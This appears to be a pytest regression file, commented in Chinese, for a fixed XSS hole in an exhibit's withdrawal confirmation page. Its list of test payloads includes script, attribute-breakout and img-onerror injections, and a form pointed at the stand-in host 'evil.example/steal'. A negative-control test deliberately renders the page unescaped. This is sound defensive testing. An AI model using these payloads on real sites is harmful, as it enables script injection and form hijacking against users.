"""撤回確認頁不准被 query string 改寫（2026-09-21 驗證者實測抓到）。

這支在架構裡承重什麼：`/withdraw/<id>` 是**觀眾決定要不要刪掉自己**的那一頁。
能改寫它 ＝ 能對觀眾謊報「按下去會發生什麼」——倫理面比一般 XSS 嚴重，
因為這個展件的整個主張就是「刪除看得見、而且你可以信那句話」。

實測重現（修前）：
    GET /withdraw/v1?a="><script>alert(1)</script>
    → <form method="POST" action="/withdraw/v1?a="><script>alert(1)</script>">
`__ID__` 與 `__STATUS__` 本來就過了 `_html_escape`，**只有 `__ACTION__` 漏掉**。
"""
import pytest

from ops.exhibit.twin import twinlink as T


def _render(sid="v1", status="queued", q=""):
    """照 `serve()` 的 handler 那三個 replace 逐字重組（含修法）。"""
    return (T.WITHDRAW_PAGE
            .replace("__ID__", T._html_escape(sid))
            .replace("__STATUS__", T._html_escape(status))
            .replace("__ACTION__", T._html_escape(
                "/withdraw/" + sid + (f"?{q}" if q else ""))))


ATTACKS = [
    'a="><script>alert(1)</script>',
    'a=%22%3E%3Cscript%3E',
    'a="onmouseover="alert(1)',
    "a='><img src=x onerror=alert(1)>",
    'a=</form><form action="//evil.example/steal">',
]


@pytest.mark.parametrize("q", ATTACKS)
def test_query_string_cannot_break_out_of_the_attribute(q):
    page = _render(q=q)
    assert "<script>" not in page
    assert "<img" not in page
    # 表單只准有一個，而且 method 只准是 POST 到自己
    assert page.count("<form") == 1, "query string 生出了第二個表單"
    assert 'action="/withdraw/' in page


def test_id_and_status_were_already_escaped():
    """⚠ 這兩個修前就是對的。加這條是為了守住它們別在重構時掉。"""
    page = _render(sid='<b>x</b>', status='<i>y</i>')
    assert "<b>" not in page and "<i>" not in page


def test_negative_control_unescaped_action_would_fail_this_file():
    """**負控制**：把修法拿掉（`__ACTION__` 不過 escape），第一條必須紅。

    沒有這一條，上面那些 assert 跟一個永遠通過的測試長得一樣。
    """
    q = 'a="><script>alert(1)</script>'
    bad = (T.WITHDRAW_PAGE
           .replace("__ID__", T._html_escape("v1"))
           .replace("__STATUS__", T._html_escape("queued"))
           .replace("__ACTION__", "/withdraw/v1?" + q))   # ← 刻意不 escape
    assert "<script>" in bad, "負控制失效：舊行為應該會注入，卻沒有"
    assert bad.count("<form") == 1  # 這個攻擊字串是屬性逃逸不是多開表單


def test_escape_covers_the_four_dangerous_chars():
    e = T._html_escape
    assert e("&") == "&amp;"
    assert e("<") == "&lt;" and e(">") == "&gt;"
    assert e('"') == "&quot;"
